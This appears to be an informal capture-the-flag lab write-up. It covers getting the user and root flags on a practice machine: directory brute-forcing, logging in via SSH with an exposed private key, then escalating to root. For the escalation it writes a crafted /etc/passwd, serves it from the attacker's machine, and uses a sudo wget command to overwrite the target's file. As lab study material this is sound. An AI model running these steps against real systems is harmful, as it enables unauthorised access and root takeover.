IP = 10.10.189.24


#1 	User flag

First we use gobuster and the common.txt dictionary

and we found .ssh , inside got rsa file but its not password secured so we can use the RSA_ID to login

jessie(name is found at the webiste source code)@10.10.189.24

ssh -i jessieRSA.txt jessie@10.10.189.24

then we are in the system 

then we cd /home/jessie and found her password







#2 	Root flag

now for root password!!

we better gain access to root rather than get file from root (says John Hammond !)

first we copy target's /etc/passwd  , cat /etc/passwd and copy it into our own machine then

we go python3

import crypt (encryption)

import crypt.crypt("PassswordYouWant")

$6$IQdZxab8T2zYfFd8$8rCJv/qU/v6khPJKZ1FtzGidhhr0s3b/oMBtMqyHNYnDJkot.y5cjr93NW4AxyK5wR0jNF8JcL00jh5LJG/2L.

then put at root:x(replace the x with this string above) 

then save at your machine as passwd 

then oepn a server on your machine  : python -m SimpleHTTPServer

then go target machine and get the passwd from me : sudo wget 10.9.23.248(ur machine ip):8000(port stated at ur machine  python -m simple)/passwd(the file i wanna put at target machine(must be only at ur current directory)) -O /etc/passwd (at where target machine , if not state will be at /dev/shm)

check if ur passwd is done , cat /etc/passwd

then su = switch user to root : su root
then type password
